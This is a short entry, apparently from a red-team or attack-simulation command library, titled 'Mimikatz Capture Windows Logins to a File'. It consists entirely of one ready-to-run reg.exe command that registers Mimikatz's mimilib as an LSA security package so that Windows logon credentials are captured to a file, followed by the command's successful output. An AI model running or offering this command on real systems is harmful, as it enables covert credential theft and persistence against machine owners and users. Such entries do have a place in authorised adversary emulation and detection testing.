---
id: 1f500a8e-1308-40ac-9440-df345a204012
name: Mimikatz Capture Windows Logins to a File
type: command
executor: command_prompt
data: reg.exe add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
  /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ
  /F
output: 'C:\Windows\system32>reg.exe add "hklm\system\currentcontrolset\control\lsa\"
  /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib"
  /t REG_MULTI_SZ /F

  The operation completed successfully.'
created_at: '2020-07-13T02:28:14.896041+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Mimikatz Capture Windows Logins to a File

```command_prompt
reg.exe add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ /F
```

## Expected Output

```
C:\Windows\system32>reg.exe add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ /F
The operation completed successfully.
```


